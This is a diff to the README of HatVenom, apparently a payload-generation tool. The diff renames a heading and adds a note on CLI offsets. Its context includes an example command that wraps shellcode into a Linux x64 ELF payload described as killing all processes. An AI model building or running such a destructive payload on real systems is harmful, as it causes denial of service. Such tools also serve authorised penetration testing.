@@ -118,10 +118,12 @@ optional arguments:
   -l, --list            List all formats and platforms.
 ```
 
-## Examples
+### Examples
 
 Let's generate simple payload that kills all processes for Linux and save it to `a.out`.
 
 ```shell
 python3 hatvenom.py --format elf --arch x64 --shellcode "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
 ```
+
+**NOTE:** If you want to use offsets in the CLI version of HatVenom, then you should use `--offsets one=1,two=2`
